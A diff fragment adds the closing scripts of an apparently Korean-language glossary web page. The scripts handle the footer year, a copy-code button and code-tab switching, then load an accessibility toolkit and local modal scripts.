+    <!-- Scripts -->
+    <script>document.getElementById('currentYear').textContent = new Date().getFullYear();</script>
+    <script>
+    // 코드 복사 기능
+    function copyCode(btn) {
+        const codeBlock = btn.parentElement.querySelector('code');
+        navigator.clipboard.writeText(codeBlock.textContent).then(() => {
+            btn.textContent = '✅ 복사됨!';
+            setTimeout(() => btn.textContent = '📋 복사', 2000);
+        });
+    }
+
+    // 코드 탭 전환
+    document.querySelectorAll('.code-tab').forEach(tab => {
+        tab.addEventListener('click', function() {
+            const lang = this.dataset.lang;
+            const section = this.closest('.term-section');
+
+            section.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
+            this.classList.add('active');
+
+            section.querySelectorAll('.code-block').forEach(block => {
+                block.classList.remove('active');
+                if (block.dataset.lang === lang) {
+                    block.classList.add('active');
+                }
+            });
+        });
+    });
+    </script>
+    <script>window.WIA_A11Y_CONFIG = { fabBottom: "78px", fabRight: "170px" };</script>
+    <script src="https://wia.live/wia-a11y-toolkit/wia-a11y-toolkit.min.js"></script>
+    <script src="/components/ask-ai/kaitrust-ai-modal.js"></script>
+    <script src="/components/language-modal/wia-language-modal-211.js"></script>
+<script src="/glossary/js/term-sections.js"></script>
+</body>
+</html>
